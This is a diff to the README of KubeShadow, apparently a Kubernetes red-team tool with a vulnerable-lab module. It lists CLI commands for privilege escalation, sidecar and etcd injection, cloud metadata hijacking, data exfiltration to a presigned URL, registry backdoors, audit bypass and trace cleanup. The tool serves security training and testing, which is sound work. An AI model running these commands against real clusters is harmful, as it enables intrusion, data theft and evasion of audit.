@@ -117,28 +117,116 @@ go version
 go mod download
 ```
 
-## Quick Start
+## 🚀 Quick Start - Complete Workflow
 
-1. Basic reconnaissance:
+### Step 1: Set Up Lab Environment
 ```bash
-# Full cluster analysis
-kubeshadow recon --kubeconfig ~/.kube/config
+# Create vulnerable lab for testing
+./kubeshadow lab --provider minikube --dashboard
 
-# Stealth mode (minimal API calls)
-kubeshadow recon --stealth
-
-# Only Kubernetes recon
-kubeshadow recon --k8s-only
+# Or deploy to cloud
+./kubeshadow lab --provider aws --dashboard
 ```
 
-2. View available commands:
+### Step 2: Reconnaissance
 ```bash
-kubeshadow --help
+# Discover cluster vulnerabilities
+./kubeshadow recon --dashboard
+
+# Stealth reconnaissance
+./kubeshadow recon --stealth --dashboard
 ```
 
-## 🧪 Creating a Lab Environment
+### Step 3: Exploitation
+```bash
+# RBAC privilege escalation
+./kubeshadow rbac-escalate --dashboard
 
-KubeShadow includes a comprehensive lab module that creates intentionally vulnerable Kubernetes environments for hands-on security practice. This is perfect for learning, testing, and demonstrating Kubernetes security concepts.
+# Sidecar injection
+./kubeshadow sidecar-inject --dashboard
+
+# Kubelet exploitation
+./kubeshadow kubelet-jack --dashboard
+```
+
+### Step 4: Post-Exploitation
+```bash
+# Data exfiltration
+./kubeshadow data-exfil --presigned-url "YOUR_URL" --dashboard
+
+# Cleanup traces
+./kubeshadow cleanup --dashboard
+```
+
+### Step 5: Clean Up Lab
+```bash
+# Remove lab resources
+./kubeshadow lab cleanup
+```
+
+## 📋 Command Reference (Organized by Workflow)
+
+### 🔍 1. Reconnaissance Commands
+```bash
+# Basic cluster reconnaissance
+./kubeshadow recon --dashboard
+
+# Stealth reconnaissance (minimal API calls)
+./kubeshadow recon --stealth --dashboard
+
+# OWASP Top 10 security assessment
+./kubeshadow owasp --dashboard
+```
+
+### ⚔️ 2. Exploitation Commands
+```bash
+# RBAC privilege escalation
+./kubeshadow rbac-escalate --dashboard
+
+# Sidecar container injection
+./kubeshadow sidecar-inject --dashboard
+
+# Kubelet API exploitation
+./kubeshadow kubelet-jack --dashboard
+
+# ETCD direct injection
+./kubeshadow etcd-inject --dashboard
+
+# Namespace pivoting
+./kubeshadow namespace-pivot --dashboard
+```
+
+### ☁️ 3. Cloud Exploitation Commands
+```bash
+# Cloud metadata hijacking
+./kubeshadow metadata-hijack --dashboard
+
+# Cloud privilege escalation
+./kubeshadow cloud-elevator --dashboard
+
+# AWS role assumption abuse
+./kubeshadow assume-role-abuse --dashboard
+```
+
+### 🎯 4. Post-Exploitation Commands
+```bash
+# Data exfiltration to cloud storage
+./kubeshadow data-exfil --presigned-url "YOUR_URL" --dashboard
+
+# Registry backdoor injection
+./kubeshadow registry-backdoor --dashboard
+
+# Stealth operations
+./kubeshadow audit-bypass --dashboard
+./kubeshadow dns-cache-poison --dashboard
+
+# Cleanup traces
+./kubeshadow cleanup --dashboard
+```
+
+## 🧪 Lab Environment Setup
+
+KubeShadow includes a comprehensive lab module that creates intentionally vulnerable Kubernetes environments for hands-on security practice.
 
 ### Prerequisites & Cloud Setup
 
